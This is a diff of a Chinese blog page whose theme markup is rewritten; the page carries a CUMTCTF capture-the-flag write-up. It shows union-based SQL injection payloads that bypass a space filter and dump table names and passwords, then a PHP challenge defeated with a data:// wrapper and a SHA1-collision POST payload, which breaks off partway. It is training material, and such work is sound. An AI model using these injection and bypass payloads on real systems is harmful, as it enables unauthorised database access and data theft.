@@ -1,252 +1,175 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>cumtctf | 一路走到黑</title><meta name="keywords" content="sql,文件包含,rsa"><meta name="author" content="sunzy"><meta name="copyright" content="sunzy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CUMTCTF-wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cumtctf">
+<meta property="og:url" content="https://sunzhengyu99.github.io/2020/09/27/cumtctf/index.html">
+<meta property="og:site_name" content="一路走到黑">
+<meta property="og:description" content="CUMTCTF-wp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2020-09-27T13:26:44.000Z">
+<meta property="article:modified_time" content="2020-11-30T02:01:05.999Z">
+<meta property="article:author" content="sunzy">
+<meta property="article:tag" content="sql">
+<meta property="article:tag" content="文件包含">
+<meta property="article:tag" content="rsa">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://sunzhengyu99.github.io/2020/09/27/cumtctf/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
 
+const saveToLocal = {
+  // ttl 單位是 天
+  set: function setWithExpiry(key, value, ttl) {
+    if (ttl === 0) return
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
 
-<!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
 
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
 
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
 
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/feiji.png">
-  <link rel="icon" type="image/png" href="/img/feiji.png">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="">
-  <meta name="author" content="sunzy">
-  <meta name="keywords" content="">
-  <title>cumtctf - 一路走到黑</title>
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2020-11-30 10:01:05'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
-
-
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
-
-  
-    
-    
-      
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/a11y-light.min.css" />
-    
-  
-
-  
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-<!-- 自定义样式保持在最底部 -->
-
-
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 4.2.0"></head>
-
-
-<body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>Sunzy'blog</strong>&nbsp;</a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                友链
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;</a>
-          </li>
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" href="javascript:">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-    <div class="banner intro-2" id="background" parallax=true
-         style="background: url('https://i.loli.net/2020/10/24/eBR35xZYEbuzSW9.jpg') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="container page-header text-center fade-in-up">
-            <span class="h2" id="subtitle">
-              
-            </span>
-
-            
-              <div class="mt-3">
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-09-27 21:26" pubdate>
-        2020年9月27日 晚上
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      1.7k 字
-    </span>
-  
-
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      26
-       分钟
-    </span>
-  
-
-  
-  
-    
-      <!-- 不蒜子统计文章PV -->
-      <span id="busuanzi_container_page_pv" style="display: none">
-        <i class="iconfont icon-eye" aria-hidden="true"></i>
-        <span id="busuanzi_value_page_pv"></span> 次
-      </span>
-    
-  
-</div>
-
-            
-          </div>
-
-          
-        </div>
-      </div>
-    </div>
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="container nopadding-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto" id="post">
-            <!-- SEO header -->
-            <h1 style="display: none">cumtctf</h1>
-            
-              <p class="note note-info">
-                
-                  本文最后更新于：2 个月前
-                
-              </p>
-            
-            <div class="markdown-body" id="post-body">
-              <h1 id="CUMTCTF-wp"><a href="#CUMTCTF-wp" class="headerlink" title="CUMTCTF-wp"></a>CUMTCTF-wp</h1><a id="more"></a>
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">41</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">一路走到黑</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">cumtctf</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-09-27T13:26:44.000Z" title="发表于 2020-09-27 21:26:44">2020-09-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-30T02:01:05.999Z" title="更新于 2020-11-30 10:01:05">2020-11-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CUMTCTF-wp"><a href="#CUMTCTF-wp" class="headerlink" title="CUMTCTF-wp"></a>CUMTCTF-wp</h1><span id="more"></span>
 
 <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>提示GET一个1,那就 url+?1</p>
 <p>提示post一个2</p>
@@ -257,543 +180,55 @@
 <h3 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h3><p>首先判断是否存在注入<code>username=admin&amp;password=pw&#39;</code></p>
 <p>在后面加上单引号后出现报错提示，确认有注入点</p>
 <p>但是继续测试 <code>&#39;or 1=1 #</code>会出现</p>
-<p><img src="https://i.loli.net/2020/11/30/J6rdWUDupV4iTI5.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/J6rdWUDupV4iTI5.png" alt></p>
 <p>判断存在黑名单过滤。</p>
 <p>接下来就是判断是将什么加入黑名单了，经过字典测试发现是<strong>空格</strong>，这里可以使用/**/绕过。</p>
 <p>先测试有多少列，<code>&#39;union/**/select/**/1,2,3,4,5,6,7#</code>  到第七的时候，页面报错。</p>
 <p>   <code>&#39;union/**/select/**/1,2,3,4,5,6,7,8#</code> 到第八的时候显示下图，说明一共八列，并且第四列出现回显。</p>
-<p><img src="https://i.loli.net/2020/11/30/bltS5moZHWkOEGF.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/bltS5moZHWkOEGF.png" alt></p>
 <p><strong>爆表</strong></p>
-<div class="hljs"><pre><code class="hljs sql">username=admin&amp;password=pw'union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-keyword">group_concat</span>(TABLE_NAME),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.TABLES<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>TABLE_SCHEMA=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#</span></code></pre></div>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=pw&#x27;<span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="built_in">group_concat</span>(TABLE_NAME),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span><span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.TABLES<span class="comment">/**/</span><span class="built_in">where</span><span class="comment">/**/</span>TABLE_SCHEMA=<span class="built_in">database</span>()<span class="meta">#</span></span><br></pre></td></tr></table></figure>
 
 <p><strong>爆列名</strong></p>
-<div class="hljs"><pre><code class="hljs sql">username=admin&amp;password=pw'union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-keyword">group_concat</span>(COLUMN_NAME),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.COLUMNS<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>TABLE_NAME=<span class="hljs-string">'users'</span><span class="hljs-comment">#</span></code></pre></div>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=pw&#x27;<span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="built_in">group_concat</span>(COLUMN_NAME),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span><span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.COLUMNS<span class="comment">/**/</span><span class="built_in">where</span><span class="comment">/**/</span>TABLE_NAME=&#x27;users&#x27;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
 
 <p><code>user_id,first_name,last_name,user,password,avatar,last_login,failed_login</code>列名很多，选择password</p>
 <p><strong>爆flag</strong></p>
-<div class="hljs"><pre><code class="hljs sql">username=admin&amp;password=pw'union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">password</span>),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">users</span><span class="hljs-comment">#</span></code></pre></div>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">username</span>=admin&amp;password=pw&#x27;union/**/select/**/<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,group_concat(password),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>/**/from/**/users#</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/09/27/cumtctf/w2-3.png" srcset="/img/loading.gif" alt></p>
-<h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>扫描一下目录发现存在一个<a href="http://www.zip的文件，直接下载得到源码，下面就是一层一层的绕过" target="_blank" rel="noopener">www.zip的文件，直接下载得到源码，下面就是一层一层的绕过</a></p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-error_reporting(<span class="hljs-number">0</span>);
-<span class="hljs-keyword">include_once</span>(<span class="hljs-string">'flag.php'</span>);
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'param1'</span>]))
-&#123;
-    $str1=$_GET[<span class="hljs-string">'param1'</span>];
-    <span class="hljs-keyword">if</span>(file_get_contents($str1)!==<span class="hljs-string">'Suvin_wants_a_girlfriend'</span>)
-        <span class="hljs-keyword">die</span>(<span class="hljs-string">"Suvin doesn't like you"</span>);
-    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'param2'</span>]))&#123;
-        $str2=$_GET[<span class="hljs-string">'param2'</span>];
-        <span class="hljs-keyword">if</span>(!is_numeric($str2))
-            <span class="hljs-keyword">die</span>(<span class="hljs-string">'Suvin prefers strings of Numbers'</span>);
-        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($str2&lt;<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">30</span>)
-            <span class="hljs-keyword">die</span>(<span class="hljs-string">'Suvin says the num is too short'</span>);
-        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($str2&gt;<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">31</span>)
-            <span class="hljs-keyword">die</span>(<span class="hljs-string">'Suvin says the num is too long'</span>);
-        <span class="hljs-keyword">else</span> &#123;
-            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Suvin says he's falling in love with you!"</span>.<span class="hljs-string">"&lt;/br&gt;"</span>;
-            sleep(intval($str2)); 
-        &#125;
-        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'param1'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'param2'</span>])) &#123;
-            $str1=$_POST[<span class="hljs-string">'param1'</span>];
-            $str2=$_POST[<span class="hljs-string">'param2'</span>];
-            <span class="hljs-keyword">if</span>(strlen($str1)&gt;<span class="hljs-number">1000</span>)
-                <span class="hljs-keyword">die</span>(<span class="hljs-string">"It's too long"</span>);
-            <span class="hljs-keyword">if</span>(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))
-                <span class="hljs-keyword">echo</span> $flag;
-            <span class="hljs-keyword">else</span> 
-                <span class="hljs-keyword">die</span>(<span class="hljs-string">"It's so similar to md5"</span>);
-        &#125;
-    &#125;
-&#125;
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<p><img src="/2020/09/27/cumtctf/w2-3.png" alt></p>
+<h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>扫描一下目录发现存在一个<a target="_blank" rel="noopener" href="http://www.zip的文件，直接下载得到源码，下面就是一层一层的绕过">www.zip的文件，直接下载得到源码，下面就是一层一层的绕过</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$str1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;param1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(file_get_contents(<span class="variable">$str1</span>)!==<span class="string">&#x27;Suvin_wants_a_girlfriend&#x27;</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Suvin doesn&#x27;t like you&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!is_numeric(<span class="variable">$str2</span>))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Suvin prefers strings of Numbers&#x27;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$str2</span>&lt;<span class="number">3600</span>*<span class="number">24</span>*<span class="number">30</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Suvin says the num is too short&#x27;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$str2</span>&gt;<span class="number">3600</span>*<span class="number">24</span>*<span class="number">31</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Suvin says the num is too long&#x27;</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Suvin says he&#x27;s falling in love with you!&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            sleep(intval(<span class="variable">$str2</span>)); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$str1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>];</span><br><span class="line">            <span class="variable">$str2</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="variable">$str1</span>)&gt;<span class="number">1000</span>)</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;It&#x27;s too long&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(((<span class="keyword">string</span>)<span class="variable">$str1</span>!==(<span class="keyword">string</span>)<span class="variable">$str2</span>)&amp;&amp;(sha1(<span class="variable">$str1</span>)===sha1(<span class="variable">$str2</span>)))</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;It&#x27;s so similar to md5&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>首先get方式获取两个参数，param1要等于那个字符串，这里使用php的data伪协议</p>
 <p>param2要在<code>3600*24*30</code>和<code>3600*24*31</code>之间，可以取2.6e6,这两个参数绕过后，就要绕过下面的post方式上传的两个值</p>
 <p>对parame1的长度进行了限制，并且两参数的字符串形式不相等，sha1的值要相等，首先想到的是与md5函数一样，使用数组绕过，但是这题没那么简单，试了很多次都不行。网上搜了一下，发现了一个很类似的题目（sha1弱碰撞），其中也给出符合要求的字符串。</p>
-<p><a href="https://blog.csdn.net/caiqiiqi/article/details/68953730?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-1-68953730.nonecase&utm_term=%E4%B8%8D%E5%90%8C%E5%AD%97%E7%AC%A6%E4%B8%B2sha1%E4%B8%80%E6%A0%B7" target="_blank" rel="noopener">点这里</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/caiqiiqi/article/details/68953730?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-1-68953730.nonecase&utm_term=%E4%B8%8D%E5%90%8C%E5%AD%97%E7%AC%A6%E4%B8%B2sha1%E4%B8%80%E6%A0%B7">点这里</a></p>
 <p>完整的payload：</p>
 <p><code>?param1=data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k&amp;param2=0.26e7</code></p>
-<div class="hljs"><pre><code class="hljs llvm">POST:
-param<span class="hljs-number">1</span>=<span class="hljs-symbol">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%25</span><span class="hljs-symbol">%E2</span><span class="hljs-symbol">%E3</span><span class="hljs-symbol">%CF</span><span class="hljs-symbol">%D3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-number">1</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>obj<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%3</span>C<span class="hljs-symbol">%3</span>C/Width<span class="hljs-symbol">%202</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Height<span class="hljs-symbol">%203</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Type<span class="hljs-symbol">%204</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Subtype<span class="hljs-symbol">%205</span><span class="hljs-symbol">%200</span><span 